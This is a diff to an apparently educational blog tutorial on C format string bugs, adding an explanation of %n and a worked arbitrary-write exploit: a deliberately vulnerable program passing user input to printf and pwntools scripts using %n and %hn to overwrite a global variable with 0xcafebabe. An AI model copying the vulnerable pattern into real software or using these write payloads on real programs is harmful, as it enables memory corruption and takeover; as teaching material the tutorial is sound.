@@ -77,10 +77,15 @@ Format specifiers in C are used to take inputs and print the output of a type. I
 		<td>%h</td>
 		<td>Specifies that the length is two bytes</td>
 	</tr>
+		</tr>
+		<tr>
+		<td>%n</td>
+		<td>writes number of characters printed by to a variable (only the characters present before %n in a string count)</td>
+	</tr>
 </table>
 
 ## Format String Bug
-It occurs when the user input is passed as format argument to the printf of scanf family of functions. Consider a simple C program:
+It occurs when the user input is passed as format argument to the printf or scanf family of functions. Consider a simple C program:
 ```c
 #include<stdio.h>
 
@@ -197,10 +202,119 @@ pwndbg> x/10gx $rsp
 `0x404060` is the address of the buffer `secret`. It is stored at the offset `9`. Sending `%9$s` with some padding to account for the 8 byte alignment would print the string stored at `0x404060`.
 <img src='https://github.com/0xSh4dy/0xSh4dy.github.io/blob/master/assets/img/fmtstr/fmtstr_04.png?raw=true'>
 
+
+### The `%n` format specifier
+`%n` causes `printf` to load the variable pointed by the corresponding argument with a value equal to the number of characters that have been printed by `printf`(for the current call) before the occurence of `%n`.
+
+```c
+#include<stdio.h>
+
+int main(){
+	int var;
+	printf("Yo,wassup?%n\n",&var);
+	printf("var -> %d\n",var);
+	return 0;
+}
+```
+Let's run this program.
+```py
+➜  formatStrings ./temp 
+Yo,wassup?
+var -> 10
+```
+
+
+### Arbitrary Write using format strings
+Format string bugs can also be used to write data to arbitrary locations. Let's create a basic C application that can be exploited via format string attacks.
+```c
+#include<stdio.h>
+#include<string.h>
+
+unsigned long modify_me = 0xdeadbeef;
+
+void func(){
+	char buf[56];
+	scanf("%56s",buf);
+	printf(buf);
+}
+
+int main(){
+	printf("\nInitial value of modify_me -> 0x%lx\n",modify_me);
+	func();
+	printf("\nFinal value of modify_me -> 0x%lx\n",modify_me);
+	return 0;
+}
+
+```
+Our goal is to modify the value of the global variable `modify_me`. Let's dump the stack (using the same technique used before)
+```py
+pwndbg> x/10gx $rsp
+0x7fffffffdd40:	0x6161616161616161	0x6262626262626262
+0x7fffffffdd50:	0x00007fffffffdd00	0x000000000040126d
+0x7fffffffdd60:	0x00007ffff7fb12e8	0x0000000000401220
+0x7fffffffdd70:	0x0000000000401220	0x6da2ce890c4c5800
+0x7fffffffdd80:	0x00007fffffffdd90	0x00000000004011fe
+
+```
+`aaaaaaaa` is stored at the offset 6 (it can be verified by sending `aaaaaaaa.%6$p`). Let's store the address of `modify_me` at the offset 7 and write 4 bytes into it.
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+elf = context.binary = ELF("./chall")
+
+p = elf.process()
+payload = b'aaaa%7$n'+ p32(elf.sym.modify_me)
+p.sendline(payload)
+p.interactive()
+```
+<img src='https://github.com/0xSh4dy/0xSh4dy.github.io/blob/master/assets/img/fmtstr/fmtstr_05.png?raw=true'>
+
+The value of the variable `modify_me` was overwritten by the value 4 because our payload forced `printf` to print 4 bytes (`aaaa`). The payload `b'0%3c%7$n'+ p32(elf.sym.modify_me)` can be used to do the same thing. It would be really awesome if we overwrite the variable by particular value, let's say `0xcafebabe`. Now, you might be thinking about forcing printf to print `0xcafebabe` number of characters. This method is not efficient because you'll need to wait for printf to print `0xcafebabe` no. of characters which may take time. Instead, we'll try to write one or two bytes at a time. The format specifier `%h` specifies that the length is two bytes. We can use it for our advantage. 
+
+Here, the address of `modify_me` is 0x404040. Our goal is to write `0xcafebabe` at this address. Instead of writing the entire number, we can write data in chunks i.e 2 bytes at a time. We can use `%hn` for that. The part of the stack storing our payload should look like this:
+```
+payload_1                 payload_1_continued
+
+payload_2                 payload_2_continued
+
+address_1(0x404040)       address_2(0x404042)
+```
+Writing `0xbabe` at `0x404040` and `0xcafe` at `0x404042` will do the job (assuming little-endian architecture). In this case, the target addresses that should be overwritten are stored at offsets 10 and 11 respectively. Please note that the payload size should be a multiple of 8 bytes. Let's craft the payload now.
+47806 is the decimal representation of 0xbabe.
+So, the default payload for writing 0xbabe at the address stored at offset 10 would be `%47806c%10$hn`. Let's add some padding to make its size a multiple of 8 bytes (it would ensure that the target address remain aligned). Adding 3 characters and decreasing 47806 by 3 would do the job. So, the new padded payload is `aaa%47803c%10$hn`. Now, let's craft a payload to write `0xcafe (51966 in decimal)` at the address stored at the offset 11. Please note that in this case, the entire payload is passed to a single printf, and 47806 bytes have already been written by printf. This means that we only need to add 4160 more bytes (0xcafe-0xbabe). `aaaa%4156c%11$hn` will do the job. Let's write a simple python script.
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+elf = context.binary = ELF("./chall")
+
+p = elf.process()
+
+target = 0x404040
+
+payload = b''
+payload +=b'aaa%47803c%10$hn'
+payload += b'aaaa%4156c%11$hn'
+payload += p64(0x404040)
+payload += p64(0x404042)
+
+p.sendline(payload)
+p.interactive()
+```
+<img src='https://github.com/0xSh4dy/0xSh4dy.github.io/blob/master/assets/img/fmtstr/fmtstr_06.png?raw=true'>
+
+
+Awesome, isn't it?
+
+
+
+
+
 References:
+<br>
+
 [https://www.freecodecamp.org/news/format-specifiers-in-c/](https://www.freecodecamp.org/news/format-specifiers-in-c/)
-
 [https://kevinalmansa.github.io/application%20security/Format-Strings/](https://kevinalmansa.github.io/application%20security/Format-Strings/)
-
 [https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)
 
